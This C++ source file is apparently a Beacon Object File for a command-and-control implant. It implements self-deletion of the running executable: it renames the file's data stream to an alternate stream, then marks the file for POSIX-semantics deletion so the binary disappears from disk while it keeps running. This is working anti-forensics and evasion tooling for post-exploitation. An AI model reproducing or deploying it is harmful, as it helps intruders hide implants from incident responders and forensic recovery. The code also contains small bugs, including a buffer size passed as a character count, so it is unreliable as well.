#include <Externs.hpp>
#include <Common.hpp>

#define FILE_DISPOSITION_DELETE 0x00000001
#define FILE_DISPOSITION_POSIX_SEMANTICS 0x00000002
#define FileDispositionInfoEx 21

auto SelfDelete() -> int {
    WCHAR path[MAX_PATH*2];
    if (!GetModuleFileNameW(nullptr, path, sizeof( path ) )) {
        BeaconPrintf(CALLBACK_ERROR, "GetModuleFileNameW Failed: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    auto h_file = CreateFileW(
        path,
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
        );

    if (h_file == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFileW Failed: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    const auto new_stream = L":redxvz";
    const auto size_stream = wcslen(new_stream) * sizeof(WCHAR);
    const auto size_rename = sizeof(FILE_RENAME_INFO) + size_stream;
    const auto p_rename = static_cast<PFILE_RENAME_INFO>(Mem::Alloc(size_rename));
    if (!p_rename) {
        BeaconPrintf(CALLBACK_ERROR, "HeapAlloc Failed: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    p_rename->FileNameLength = size_stream;
    RtlCopyMemory(p_rename->FileName, new_stream, size_stream);
    if (!SetFileInformationByHandle(h_file, FileRenameInfo, p_rename, size_rename)) {
        BeaconPrintf(CALLBACK_ERROR, "SetFileInformationByHandle Failed: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    CloseHandle(h_file);

    h_file = CreateFileW(
        path,
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    FILE_DISPOSITION_INFO_EX info = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
    if (!SetFileInformationByHandle(h_file, static_cast<FILE_INFO_BY_HANDLE_CLASS>(FileDispositionInfoEx), &info, sizeof(info))) {
        BeaconPrintf(CALLBACK_ERROR, "SetFileInformationByHandle Failed: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Self file deletion succefully\n");

    CloseHandle(h_file);
    if ( p_rename ) Mem::Free( p_rename );

    return EXIT_SUCCESS;
}

auto go(PCHAR Args, INT Argc) -> void {
    Start();

    SelfDelete();    
}